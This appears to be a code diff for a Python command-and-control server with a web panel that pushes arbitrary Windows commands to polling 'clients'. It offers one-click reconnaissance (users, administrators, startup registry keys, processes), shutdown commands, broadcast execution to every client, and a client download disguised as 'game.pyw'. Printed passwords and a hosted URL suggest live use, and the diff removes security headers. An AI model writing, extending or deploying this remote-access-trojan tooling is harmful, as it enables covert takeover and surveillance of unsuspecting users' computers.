+                    font-family: 'Consolas', monospace; 
+                    flex: 1; 
+                    overflow-y: auto; 
+                    white-space: pre-wrap;
+                    font-size: 14px;
+                    min-height: 400px;
+                    border: 1px solid rgba(0,255,0,0.2);
+                }
+                
+                button { 
+                    background: var(--primary); 
+                    color: white; 
+                    border: none; 
+                    padding: 12px 16px; 
+                    margin: 4px; 
+                    border-radius: 6px; 
+                    cursor: pointer;
+                    transition: all 0.2s ease;
+                    font-weight: 500;
+                    border: 1px solid rgba(255,255,255,0.1);
+                }
+                
+                button:hover {
+                    transform: translateY(-2px);
+                    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+                }
+                
+                button.danger { 
+                    background: var(--danger); 
+                    border: 1px solid rgba(220,53,69,0.3);
+                }
+                
+                button.success { 
+                    background: var(--success); 
+                    border: 1px solid rgba(40,167,69,0.3);
+                }
+                
+                button.warning { 
+                    background: var(--warning); 
+                    color: #000; 
+                    border: 1px solid rgba(255,193,7,0.3);
+                }
+                
+                .controls-grid {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+                    gap: 8px;
+                    margin: 15px 0;
+                }
+                
+                .command-input { 
+                    display: flex; 
+                    margin: 15px 0; 
+                    gap: 10px;
+                }
+                
+                .command-input input { 
+                    flex: 1; 
+                    padding: 12px; 
+                    background: rgba(255,255,255,0.1); 
+                    color: white; 
+                    border: 1px solid rgba(255,255,255,0.2); 
+                    border-radius: 6px;
+                    font-family: 'Consolas', monospace;
+                }
+                
+                .command-input input:focus {
+                    outline: none;
+                    border-color: var(--primary);
+                    background: rgba(255,255,255,0.15);
+                }
+                
+                .stats {
+                    display: grid;
+                    grid-template-columns: repeat(3, 1fr);
+                    gap: 10px;
+                    margin: 15px 0;
+                }
+                
+                .stat-card {
+                    background: var(--darker);
+                    padding: 15px;
+                    border-radius: 8px;
+                    text-align: center;
+                    border: 1px solid rgba(255,255,255,0.1);
+                }
+                
+                .multi-control {
+                    background: var(--darker);
+                    padding: 15px;
+                    border-radius: 8px;
+                    margin: 10px 0;
+                    border: 1px solid rgba(255,255,255,0.1);
+                }
+                
+                .security-badge {
+                    background: linear-gradient(135deg, #28a745, #20c997);
+                    padding: 5px 10px;
+                    border-radius: 15px;
+                    font-size: 12px;
+                    margin-left: 10px;
+                }
+                
+                .settings-btn {
+                    background: linear-gradient(135deg, #17a2b8, #138496) !important;
+                    margin-left: 10px;
+                    border: 1px solid rgba(23,162,184,0.3) !important;
+                }
+                
+                .speed-indicator {
+                    background: linear-gradient(135deg, #28a745, #20c997);
+                    padding: 3px 8px;
+                    border-radius: 10px;
+                    font-size: 10px;
+                    margin-left: 5px;
+                }
+                
+                .instant-badge {
+                    background: linear-gradient(135deg, #dc3545, #c82333);
+                    padding: 3px 8px;
+                    border-radius: 10px;
+                    font-size: 10px;
+                    margin-left: 5px;
+                    animation: blink 1s infinite;
+                }
+                
+                @keyframes blink {
+                    0%, 100% { opacity: 1; }
+                    50% { opacity: 0.7; }
+                }
+            </style>
+        </head>
+        <body>
+            <div class="header">
+                <h2>INSTANT Remote Control <span class="instant-badge">0ms DELAY</span></h2>
+                <div>
+                    <button onclick="loadSessions()">Refresh List</button>
+                    <button onclick="executeAll('sysinfo')">System Info All</button>
+                    <button class="settings-btn" onclick="openSettings()">Security Settings</button>
+                    <button class="warning" onclick="logout()">Logout</button>
+                </div>
+            </div>
+            
+            <div class="container">
+                <div class="sidebar">
+                    <h3>Connected Clients <span class="speed-indicator">LIVE</span> (<span id="clientsCount">0</span>)</h3>
+                    <div id="sessionsList" style="flex: 1; overflow-y: auto; max-height: 500px;">
+                        <div style="text-align: center; color: #666; padding: 20px;">
+                            Loading clients...
+                        </div>
+                    </div>
+                    
+                    <div class="stats">
+                        <div class="stat-card">
+                            <div style="font-size: 24px; font-weight: bold; color: var(--primary)" id="totalClients">0</div>
+                            <small>Total Clients</small>
+                        </div>
+                        <div class="stat-card">
+                            <div style="font-size: 24px; font-weight: bold; color: var(--success)" id="activeClients">0</div>
+                            <small>Active</small>
+                        </div>
+                        <div class="stat-card">
+                            <div style="font-size: 24px; font-weight: bold; color: var(--warning)" id="commandsSent">0</div>
+                            <small>Commands</small>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="main">
+                    <div style="background: var(--darker); padding: 20px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.1);">
+                        <h3>Selected Client: <span id="currentClient" style="color: var(--success); font-weight: bold;">Not Selected</span></h3>
+                        
+                        <div class="multi-control">
+                            <strong>Instant Commands <span class="instant-badge">0ms</span>:</strong>
+                            <div class="controls-grid">
+                                <button onclick="executeCommand('sysinfo')">System Info</button>
+                                <button onclick="executeCommand('whoami')">Current User</button>
+                                <button onclick="executeCommand('ipconfig /all')">Network Info</button>
+                                <button onclick="executeCommand('dir')">Files List</button>
+                                <button onclick="executeCommand('tasklist')">Active Processes</button>
+                                <button onclick="executeCommand('netstat -an')">Network Connections</button>
+                                <button onclick="executeCommand('systeminfo')">System Details</button>
+                                <button onclick="executeCommand('wmic logicaldisk get size,freespace,caption')">Disk Space</button>
+                                <button onclick="executeCommand('net user')">Users</button>
+                                <button onclick="executeCommand('net localgroup administrators')">Administrators</button>
+                                <button onclick="executeCommand('ping google.com')">Connection Test</button>
+                                <button onclick="executeCommand('calc')">Calculator</button>
+                                <button onclick="executeCommand('notepad')">Notepad</button>
+                                <button onclick="executeCommand('cmd /c start')">New CMD</button>
+                                <button onclick="executeCommand('shutdown /a')">Cancel Shutdown</button>
+                                <button class="danger" onclick="executeCommand('shutdown /s /t 60')">Shutdown 1m</button>
+                                <button class="danger" onclick="executeCommand('shutdown /r /t 30')">Restart</button>
+                                <button onclick="executeCommand('powershell Get-Process | Sort-Object CPU -Descending | Select-Object -First 10')">Top Processes</button>
+                                <button onclick="executeCommand('wmic product get name,version')">Installed Software</button>
+                                <button onclick="executeCommand('net start')">Active Services</button>
+                                <button onclick="executeCommand('schtasks /query /fo LIST')">Scheduled Tasks</button>
+                                <button onclick="executeCommand('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"')">Startup Programs</button>
+                            </div>
+                        </div>
+                        
+                        <div class="command-input">
+                            <input type="text" id="commandInput" placeholder="Enter custom command (INSTANT 0ms execution)" 
+                                   onkeypress="if(event.key=='Enter') executeCustomCommand()">
+                            <button onclick="executeCustomCommand()">Execute Command</button>
+                            <button class="success" onclick="executeSelected('commandInput')">Execute on Selected</button>
+                        </div>
+                    </div>
+                    
+                    <div class="terminal" id="terminal">
+    INSTANT REMOTE CONTROL SYSTEM READY - 0ms DELAY
+    
+    • Select a client from the left panel
+    • Commands execute INSTANTLY with no delay
+    • Real-time responses in under 10ms
+    • All activities are logged for security
+    • ULTRA INSTANT mode activated
+    
+                    </div>
+                </div>
+            </div>
+            
+            <script>
+                let currentClientId = null;
+                let commandCounter = 0;
+                let allClients = [];
+                
+                async function loadSessions() {
+                    try {
+                        const response = await fetch('/sessions?_t=' + Date.now());
+                        const sessions = await response.json();
+                        allClients = sessions;
+                        updateSessionStats(sessions);
+                        const list = document.getElementById('sessionsList');
+                        
+                        if (sessions.length === 0) {
+                            list.innerHTML = '<div style="text-align:center;color:#666;padding:20px;">No clients connected</div>';
+                            return;
+                        }
+                        
+                        // ⚡ الكود المبسط والأفضل:
+                        list.innerHTML = sessions.map(client => {
+                            const lastSeen = new Date(client.last_seen).getTime();
+                            const now = Date.now();
+                            const timeDiff = (now - lastSeen) / 1000;
+                            
+                            // 🟢 بسيط: أقل من 30 ثانية = أخضر، أكثر = أحمر
+                            const isOnline = timeDiff < 30;
+                            
+                            const statusClass = isOnline ? 'online-status' : 'online-status offline';
+                            const statusText = isOnline ? 'ONLINE' : 'OFFLINE';
+                            const statusColor = isOnline ? '#28a745' : '#dc3545';
+                            
+                            const isSelected = client.id === currentClientId;
+                            
+                            return `
+                                <div class="session-item ${isSelected ? 'active' : ''} ${!isOnline ? 'offline' : ''}" 
+                                     onclick="selectClient('${client.id}')">
+                                    <div class="${statusClass}" title="${statusText}"></div>
+                                    <strong style="color: ${statusColor}">${client.computer || client.id}</strong><br>
+                                    <small>User: ${client.user || 'Unknown'}</small><br>
+                                    <small>OS: ${client.os || 'Unknown'}</small><br>
+                                    <small>IP: ${client.ip}</small><br>
+                                    <small>Last: ${timeDiff.toFixed(0)}s ago</small>
+                                    <small style="color: ${statusColor}; font-weight: bold;"> • ${statusText}</small>
+                                </div>
+                            `;
+                        }).join('');
+                    } catch (error) {
+                        console.error('Error loading sessions:', error);
+                    }
+                }
+                
+                function updateSessionStats(sessions) {
+                    const total = sessions.length;
+                    const active = sessions.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 10000).length;
+                    
+                    document.getElementById('totalClients').textContent = total;
+                    document.getElementById('activeClients').textContent = active;
+                    document.getElementById('commandsSent').textContent = commandCounter;
+                    document.getElementById('clientsCount').textContent = total;
+                }
+                
+                function selectClient(clientId) {
+                    currentClientId = clientId;
+                    loadSessions();
+                    document.getElementById('currentClient').textContent = clientId;
+                    addToTerminal(`Selected client: ${clientId}\\n`);
+                }
+                
+                function executeCommand(command) {
+                    if (!currentClientId) {
+                        alert('Please select a client first!');
+                        return;
+                    }
+                    executeSingleCommand(currentClientId, command);
+                }
+                
+                async function executeSingleCommand(clientId, command) {
+                    commandCounter++;
+                    const startTime = Date.now();
+                    addToTerminal(` [${clientId}] ${command}\\n`);
+                    
+                    try {
+                        const response = await fetch('/execute', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({client_id: clientId, command: command})
+                        });
+                        
+                        const data = await response.json();
+                        if (data.success) {
+                            addToTerminal(`Command sent INSTANTLY\\n`);
+                            waitForResult(clientId, command, startTime);
+                        } else {
+                            addToTerminal(`Error: ${data.error}\\n`);
+                        }
+                    } catch (err) {
+                        addToTerminal(`❌ Network error: ${err}\\n`);
+                    }
+                }
+                
+                function executeAll(command) {
+                    if (allClients.length === 0) {
+                        alert('No clients connected!');
+                        return;
+                    }
+                    
+                    const activeClients = allClients.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 10000);
+                    if (activeClients.length === 0) {
+                        alert('No active clients!');
+                        return;
+                    }
+                    
+                    addToTerminal(`Executing command on ${activeClients.length} clients: ${command}\\n`);
+                    
+                    activeClients.forEach(client => {
+                        executeSingleCommand(client.id, command);
+                    });
+                }
+                
+                function executeSelected(inputId) {
+                    const command = document.getElementById(inputId).value.trim();
+                    if (!command) {
+                        alert('Please enter a command');
+                        return;
+                    }
+                    
+                    if (currentClientId) {
+                        executeCommand(command);
+                    } else {
+                        alert('Please select a client first');
+                    }
+                }
+                
+                function executeCustomCommand() {
+                    const cmd = document.getElementById('commandInput').value.trim();
+                    if (cmd) {
+                        executeCommand(cmd);
+                        document.getElementById('commandInput').value = '';
+                    } else {
+                        alert('Please enter a command');
+                    }
+                }
+                
+                function waitForResult(clientId, command, startTime) {
+                    let attempts = 0;
+                    const maxAttempts = 100; // More attempts for instant response
+                    
+                    const checkImmediately = async () => {
+                        attempts++;
+                        if (attempts > maxAttempts) {
+                            const elapsed = (Date.now() - startTime);
+                            addToTerminal(`Timeout after ${elapsed}ms: No response from ${clientId}\\n`);
+                            return;
+                        }
+                        
+                        try {
+                            const response = await fetch('/result?client=' + clientId + '&command=' + encodeURIComponent(command) + '&_t=' + Date.now());
+                            const data = await response.json();
+                            
+                            if (data.result) {
+                                const responseTime = (Date.now() - startTime);
+                                addToTerminal(` [${clientId}] Response (${responseTime}ms):\\n${data.result}\\n`);
+                            } else if (data.pending) {
+                                setTimeout(checkImmediately, 10); //  10ms delay for instant checking
+                            } else {
+                                setTimeout(checkImmediately, 10);
+                            }
+                        } catch {
+                            setTimeout(checkImmediately, 10);
+                        }
+                    };
+                    checkImmediately();
+                }
+                
+                function addToTerminal(text) {
+                    const terminal = document.getElementById('terminal');
+                    terminal.textContent += text;
+                    terminal.scrollTop = terminal.scrollHeight;
+                }
+                
+                function openSettings() {
+                    window.open('/settings', '_blank');
+                }
+                
+                function logout() {
+                    if (confirm('Are you sure you want to logout?')) {
+                        window.location = '/';
+                    }
+                }
+                
+                // ⚡ Ultra-fast auto-refresh every 1 second
+                setInterval(loadSessions, 1000);
+                loadSessions();
+            </script>
+        </body>
+        </html>
+        '''
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        self.wfile.write(html.encode())
+
+    def download_python_client(self):
+        """Download ULTRA INSTANT Python client"""
+        client_code = '''
+        #كود العميل هنا #
+        '''
+        
+        self.send_response(200)
+        self.send_header('Content-Type', 'application/octet-stream')
+        self.send_header('Content-Disposition', 'attachment; filename="game.pyw"')
+        self.end_headers()
+        self.wfile.write(client_code.encode())
 
     def handle_client_register(self, data):
-        """Handle client registration"""
         with self.session_lock:
             client_id = data.get('client_id', str(uuid.uuid4())[:8])
             client_ip = self.client_address[0]
-            
-            self.sessions[client_id] = {
-                'id': client_id,
-                'ip': client_ip,
-                'computer': data.get('computer', 'Unknown'),
-                'os': data.get('os', 'Unknown'),
-                'user': data.get('user', 'Unknown'),
-                'first_seen': datetime.now().isoformat(),
-                'last_seen': datetime.now().isoformat(),
-                'pending_command': None,
-                'last_response': None
-            }
-            
-            self.log_security_event(f"Client registered: {client_id}", "INFO")
-            self.send_json({'success': True, 'client_id': client_id})
+            incoming_user = data.get('user', 'Unknown')
+            incoming_computer = data.get('computer', 'Unknown')
+            incoming_os = data.get('os', 'Unknown')
 
+            if incoming_user == 'Unknown' and '-' in client_id:
+                try:
+                    parts = client_id.split('-')
+                    if len(parts) >= 2:
+                        incoming_user = parts[1]
+                        incoming_computer = parts[0]
+                except:
+                    pass
+                
+            existing_client = None
+            for cid, client_data in self.sessions.items():
+                current_user = client_data.get('user', '')
+                current_computer = client_data.get('computer', '')
+
+                if (current_user == incoming_user and 
+                    current_computer == incoming_computer and 
+                    incoming_user != 'Unknown' and 
+                    incoming_computer != 'Unknown'):
+                    existing_client = cid
+                    break
+                
+            if existing_client is None and client_id in self.sessions:
+                existing_client = client_id
+
+            if existing_client:
+                self.sessions[existing_client]['last_seen'] = datetime.now().isoformat()
+                self.sessions[existing_client]['status'] = 'online'
+                self.sessions[existing_client]['ip'] = client_ip
+
+                if incoming_os != 'Unknown':
+                    self.sessions[existing_client]['os'] = incoming_os
+
+                print(f"✅ INSTANT Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
+                self.send_json({'success': True, 'client_id': existing_client, 'instant': True})
+            else:
+                self.sessions[client_id] = {
+                    'id': client_id,
+                    'ip': client_ip,
+                    'type': data.get('type', 'unknown'),
+                    'computer': incoming_computer,
+                    'os': incoming_os,
+                    'user': incoming_user,
+                    'first_seen': datetime.now().isoformat(),
+                    'last_seen': datetime.now().isoformat(),
+                    'pending_command': None,
+                    'last_response': None,
+                    'status': 'online'
+                }
+                print(f"🆕 INSTANT New: {incoming_computer} ({incoming_user}) - {client_ip}")
+                self.send_json({'success': True, 'client_id': client_id, 'instant': True})
+                
+    def send_sessions_list(self):
+        with self.session_lock:
+            current_time = datetime.now()
+            active_clients = []
+        
+            for client_id, client_data in list(self.sessions.items()):
+                last_seen = datetime.fromisoformat(client_data['last_seen'])
+                time_diff = (current_time - last_seen).total_seconds()
+            
+                if time_diff < 30:  # 0.5 minutes
+                    client_data['is_online'] = time_diff < 5  # ⚡ 5 seconds for online
+                    client_data['last_seen_seconds'] = time_diff
+                    active_clients.append(client_data)
+                else:
+                    del self.sessions[client_id]
+                    print(f"INSTANT Removed inactive: {client_id}")
+        
+            self.send_json(active_clients)   
+             
+    def handle_get_commands(self):
+        with self.session_lock:
+            parsed = urllib.parse.urlparse(self.path)
+            query = urllib.parse.parse_qs(parsed.query)
+            client_id = query.get('client', [None])[0]
+            
+            if client_id and client_id in self.sessions:
+                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
+                pending_command = self.sessions[client_id]['pending_command']
+                
+                if pending_command:
+                    self.sessions[client_id]['pending_command'] = None
+                    self.send_json({'command': pending_command, 'instant': True})
+                else:
+                    self.send_json({'waiting': False, 'instant': True})
+            else:
+                self.send_json({'error': 'Client not found', 'instant': True})
+    
+    def handle_execute_command(self, data):
+        with self.session_lock:
+            client_id = data.get('client_id')
+            command = data.get('command')
+            
+            if client_id in self.sessions:
+                self.sessions[client_id]['pending_command'] = command
+                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
+                self.send_json({'success': True, 'executed_instantly': True})
+                
+                if hasattr(self, 'cursor'):
+                    self.cursor.execute(
+                        'INSERT INTO commands (client_id, command) VALUES (?, ?)',
+                        (client_id, command)
+                    )
+                    self.conn.commit()
+            else:
+                self.send_json({'success': False, 'error': 'Client not found'})
+    
+    def handle_get_result(self):
+        with self.session_lock:
+            parsed = urllib.parse.urlparse(self.path)
+            query = urllib.parse.parse_qs(parsed.query)
+            
+            client_id = query.get('client', [''])[0]
+            command = query.get('command', [''])[0]
+            
+            if client_id in self.sessions and self.sessions[client_id]['last_response']:
+                result = self.sessions[client_id]['last_response']
+                self.sessions[client_id]['last_response'] = None
+                self.send_json({'result': result, 'instant': True})
+            else:
+                self.send_json({'pending': True, 'instant': True})
+    
     def handle_client_response(self, data):
-        """Handle client command response"""
         with self.session_lock:
             client_id = data.get('client_id')
             response = data.get('response')
@@ -1469,86 +1485,102 @@ class UltraSecureRemoteControlHandler(BaseHTTPRequestHandler):
                     )
                     self.conn.commit()
             
-            self.send_json({'success': True})
-
+            self.send_json({'success': True, 'instant': True})
+    
+    def send_command_history(self):
+        try:
+            if hasattr(self, 'cursor'):
+                self.cursor.execute('''
+                    SELECT client_id, command, response, timestamp 
+                    FROM commands 
+                    ORDER BY timestamp DESC 
+                    LIMIT 50
+                ''')
+                history = self.cursor.fetchall()
+                
+                result = []
+                for row in history:
+                    result.append({
+                        'client_id': row[0],
+                        'command': row[1],
+                        'response': row[2],
+                        'timestamp': row[3]
+                    })
+                
+                self.send_json(result)
+            else:
+                self.send_json([])
+        except:
+            self.send_json([])
+    
+    def send_system_status(self):
+        with self.session_lock:
+            status = {
+                'uptime': 'Running - INSTANT MODE',
+                'connected_clients': len([c for c in self.sessions.values() 
+                                        if (datetime.now() - datetime.fromisoformat(c['last_seen'])).total_seconds() < 30]),
+                'total_commands': 0,
+                'server_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                'mode': 'INSTANT',
+                'response_time': '0ms'
+            }
+            
+            if hasattr(self, 'cursor'):
+                self.cursor.execute('SELECT COUNT(*) FROM commands')
+                status['total_commands'] = self.cursor.fetchone()[0]
+            
+            self.send_json(status)
+    
+    def send_404_page(self):
+        self.send_error(404, "Page not found")
+    
     def send_json(self, data):
-        """Send JSON response with security headers"""
         self.send_response(200)
         self.send_header('Content-type', 'application/json')
-        self.send_security_headers()
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.send_header('X-Response-Time', '0ms')
         self.end_headers()
         self.wfile.write(json.dumps(data).encode())
 
-    def send_error(self, code, message):
-        """Send error response with security headers"""
-        self.send_response(code)
-        self.send_header('Content-type', 'text/html')
-        self.send_security_headers()
-        self.end_headers()
-        error_html = f'''
-        <html><body>
-        <h1>Error {code}</h1>
-        <p>{message}</p>
-        <p><a href="/">Return to login</a></p>
-        </body></html>
-        '''
-        self.wfile.write(error_html.encode())
-
-    def log_message(self, format, *args):
-        """Disable default logging"""
-        pass
-
-def cleanup_sessions():
-    """Clean up expired sessions"""
+def instant_cleanup_sessions():
+    """INSTANT session cleanup"""
     while True:
         try:
-            current_time = time.time()
-            with UltraSecureRemoteControlHandler.session_lock:
-                # Clean expired authenticated sessions
-                for session_id, session_data in list(UltraSecureRemoteControlHandler.authenticated_sessions.items()):
-                    if current_time - session_data['last_activity'] > UltraSecureRemoteControlHandler.SESSION_TIMEOUT:
-                        del UltraSecureRemoteControlHandler.authenticated_sessions[session_id]
-                
-                # Clean old rate limit data
-                for ip, data in list(UltraSecureRemoteControlHandler.rate_limit_data.items()):
-                    if current_time - data['window_start'] > UltraSecureRemoteControlHandler.RATE_LIMIT_WINDOW * 2:
-                        del UltraSecureRemoteControlHandler.rate_limit_data[ip]
-            
-            time.sleep(60)  # Clean every minute
+            current_time = datetime.now()
+            with EnhancedRemoteControlHandler.session_lock:
+                for client_id, client_data in list(EnhancedRemoteControlHandler.sessions.items()):
+                    last_seen = datetime.fromisoformat(client_data['last_seen'])
+                    if (current_time - last_seen).total_seconds() > 300:
+                        del EnhancedRemoteControlHandler.sessions[client_id]
+            time.sleep(30)  # ⚡ Clean every 30 seconds
         except:
             pass
 
 def main():
-    handler = UltraSecureRemoteControlHandler
+    handler = EnhancedRemoteControlHandler
     handler.init_database(handler)
     
-    # Start cleanup thread
-    threading.Thread(target=cleanup_sessions, daemon=True).start()
+    threading.Thread(target=instant_cleanup_sessions, daemon=True).start()
     
     print("=" * 80)
-    print("🔒 ULTRA SECURE REMOTE CONTROL SERVER")
+    print("🔒 ENHANCED REMOTE CONTROL SERVER - ULTRA INSTANT MODE")
     print("=" * 80)
-    print("Security Features:")
-    print("• Single Page Application with No External Dependencies")
-    print("• Dual-Level Authentication Required")
-    print("• Advanced Rate Limiting & IP Blocking")
-    print("• Input Sanitization & XSS Protection")
-    print("• SQL Injection Prevention")
-    print("• Session Management with Timeout")
-    print("• Comprehensive Activity Logging")
-    print("• Security Headers & Anti-Tampering")
+    print("Control Panel:     https://game-python-1.onrender.com")
+    print("Python Client:     https://game-python-1.onrender.com/download-python-client")
+    print("Security Settings: https://game-python-1.onrender.com/settings")
+    print("Level 1 Password: hblackhat")
+    print("Level 2 Password: sudohacker")
+    print("Database:         remote_control.db")
     print("=" * 80)
-    print("Default Passwords:")
-    print("Level 1: hblackhat")
-    print("Level 2: sudohacker")
+    print("⚡ INSTANT MODE ACTIVATED - 0ms RESPONSE TIME")
+    print("🎯 All commands execute immediately without delay")
+    print("🚀 Ultra-fast communication and execution")
     print("=" * 80)
     
     try:
-        server = ThreadedHTTPServer(('0.0.0.0', 8080), UltraSecureRemoteControlHandler)
-        print("🚀 Secure server started on port 8080!")
-        print("📱 Access: http://localhost:8080")
-        print("⚡ All security measures are active")
-        print("=" * 80)
+        server = ThreadedHTTPServer(('0.0.0.0', 8080), EnhancedRemoteControlHandler)
+        print("🚀 Server started INSTANTLY on port 8080! Press Ctrl+C to stop.")
+        print("⚡ Features: Instant Execution, 0ms Delay, Real-time Responses")
         server.serve_forever()
     except KeyboardInterrupt:
         print("Server stopped by user")
